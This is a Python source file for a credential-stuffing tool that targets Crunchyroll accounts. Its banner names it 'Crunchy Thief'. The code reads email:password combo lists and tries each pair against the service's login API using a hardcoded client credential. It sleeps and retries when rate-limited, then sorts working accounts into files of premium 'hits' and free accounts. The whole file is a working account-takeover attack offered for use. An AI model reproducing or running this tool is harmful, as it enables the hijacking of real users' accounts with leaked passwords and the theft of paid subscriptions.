from urllib import (
    request,
    parse,
    error
)
import re
import json
import time
from colorama import Fore,Style



regexEmailPassCombo = '[\w\.]+@[\w\.]+:[\S]+'

class CrunchyrollChecker:

    def __init__(self, filename):
        self.apiUrl = "https://beta-api.crunchyroll.com/"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
        }
        self.auth = "Basic aHJobzlxM2F3dnNrMjJ1LXRzNWE6cHROOURteXRBU2Z6QjZvbXVsSzh6cUxzYTczVE1TY1k="
        self.data = {
            "grant_type": "password",
            "scope": "offline_access"
        }
        self.filename = filename
    
    @classmethod
    def create(
        cls,
        filename : str
        ):
        self = CrunchyrollChecker(filename)
        self._resultFile()
        self._checker()

    def _checker(self):
        file = open(self.filename)
        for line in file.readlines():
            loginDetail = self._filterEmailPass(line)
            if loginDetail:
                self._tryToLogin()
            else:
                continue
        file.close()
        self.hitFile.close()
        self.invalid.close()
    
    def _makeRequest(
        self,
        url : str,
        headers : dict = None,
        data : dict = None
        ):
        if data:
            data = parse.urlencode(data).encode()
        req = request.Request(
            url,
            headers = headers,
            data = data
        )
        return req

    def _parseResponse(self, res):
        res = res.read()
        res = res.decode('utf-8')
        res = json.loads(res)
        return res
    
    def _tryToLogin(self):
        data = dict(self.data)
        data['username'] = self.email
        data['password'] = self.password
        headers = dict(self.headers)
        headers["authorization"] = self.auth
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        req = self._makeRequest(
            self.apiUrl + "auth/v1/token",
            headers,
            data
        )
        try:
            res = request.urlopen(req)
        except error.HTTPError as e:
            if e.code == 401:
                self._resultSaving('invalid')
                return
            elif e.code == 429:
                #print(f"{Fore.WHITE}Too many Requests{Fore.YELLOW}, {Fore.WHITE}Let me take a sleep for {Fore.CYAN}10 {Fore.WHITE}seconds{Fore.YELLOW}.{Fore.WHITE}")
                time.sleep(10)
                self._tryToLogin()
                return
            else:
                self._resultSaving(error = f'{Fore.RED}Error in while trying to login {Fore.CYAN}{e}{Fore.WHITE}')
        except Exception as e:
            self._resultSaving(error = f'{Fore.RED}Error in while trying to login {Fore.CYAN}{e}')
        else:
            resData = self._parseResponse(res)
            try:
                accessToken = resData['access_token']
            except KeyError:
                print(f'{Fore.BLUE}{self.email}{Fore.YELLOW}:{Fore.BLUE}{self.password} {Fore.WHITE}Something went wrong!')
                self._resultSaving(error = f'{Fore.WHITE}Access token not found {Fore.YELLOW}{resData}')
                print(resData)
            else:
                if accessToken:
                    self._premiumChecker(accessToken)
                else:
                    print(f'{Fore.BLUE}{self.email}{Fore.YELLOW}:{Fore.BLUE}{self.password} {Fore.WHITE}Something went wrong{Fore.RED}!{Fore.WHITE}')
                    print(resData)
                    self._resultSaving(error = f'Acces Token is empty {Fore.CYAN}{resData}')
    
    def _filterEmailPass(self, line):
        loginDetail = re.findall(regexEmailPassCombo, line)
        if loginDetail:
            self.email, self.password = loginDetail[0].split(':')
            return True
        else:
            return None
    
    def _resultFile(self):
        resultDir = 'result//'
        self.hitFile = open(f'{resultDir}hit.txt', 'a')
        self.freeFile = open(f'{resultDir}free.txt', 'a')
        self.invalid = open(f'{resultDir}invalid.txt', 'a')
        self.error = open(f'{resultDir}error.txt', 'a')

    def _resultSaving(self, file = 'error', error = None):
        print(f'{Fore.GREEN}')
        printMsg = f'{self.email}:{self.password}'
        if file == 'error':
            fileRefer = self.error
            printMsg += f' {Fore.BLUE}{error}{Fore.WHITE}'
            fileMsg = printMsg + '\n'
        elif file == f'{Fore.YELLOW}invalid{Fore.WHITE}':
            fileRefer = self.invalid
            fileMsg = printMsg + '\n'
            printMsg += f'{Fore.RED} Wrong!{Fore.WHITE}'
        elif file == 'hit':
            fileRefer = self.hitFile
            fileMsg = printMsg + '\n'
            #print("")
            printMsg += f'''{Fore.WHITE}[{Fore.RED}🔥{Fore.WHITE}]{Fore.GREEN} 𝗛𝗶𝘁 𝗙𝗼𝘂𝗻𝗱 {Fore.RED}! 🎉{Fore.WHITE}'''
            #print("")
        else:
            fileRefer = self.freeFile
            fileMsg = printMsg + '\n'
            #print("")
            printMsg += f'{Fore.WHITE}[{Fore.CYAN}✅{Fore.WHITE}]{Fore.MAGENTA} 𝗙𝗿𝗲𝗲 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗙𝗼𝘂𝗻𝗱{Fore.RED}!{Fore.WHITE}'
        print(printMsg)
        fileRefer.write(fileMsg)
        fileRefer.flush()

        print(f"{Fore.RED}[{Fore.YELLOW}ᴄʀᴜɴᴄʜʏ {Fore.CYAN}ᴛʜɪᴇꜰ{Fore.RED}] {Fore.WHITE}ɪꜱ ꜱᴛɪʟʟ ʜᴜɴᴛɪɴɢ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ{Fore.RED}!{Fore.GREEN}")

        


        
    
    def _premiumChecker(self, accessToken):
        header = dict(self.headers)
        header["authorization"] = f"Bearer {accessToken}"
        externalID = self._getExternalID(header)
        if externalID:
            self._subscriptionChecker(header, externalID)
        return

    def _getExternalID(self, header):
        req = self._makeRequest(
            self.apiUrl + 'accounts/v1/me',
            headers = header
        )
        try:
            res = request.urlopen(req)
        except error.HTTPError as e:
            self._resultSaving(error = f'Error while getting external id {e}')
        except Exception as e:
            self._resultSaving(error = f'Error while getting external id {e}')
        else:
            resData = self._parseResponse(res)
            try:
                externalID = resData['external_id']
            except KeyError:
                print(f'{self.email}:{self.password} Something went wrong! While getting externalID')
                print(resData)
                self._resultSaving(file = 'free')
            else:
                return externalID
        return

    def _subscriptionChecker(self, header, externalID):
        req = self._makeRequest(
            self.apiUrl + f'subs/v1/subscriptions/{externalID}/products',
            headers = header
        )
        try:
            res = request.urlopen(req)
        except error.HTTPError as e:
            if e.code == 404:
                self._resultSaving(file = 'free')
            else:
                self._resultSaving(error = f'Error while checking subscription {e}')
        except Exception as e:
            self._resultSaving(error = f'Error while checking subscription {e}')
        else:
            resData = self._parseResponse(res)
            if resData['total']:
                self._resultSaving(file = 'hit')
            else:
                self._resultSaving(file = 'free')
            print(resData)

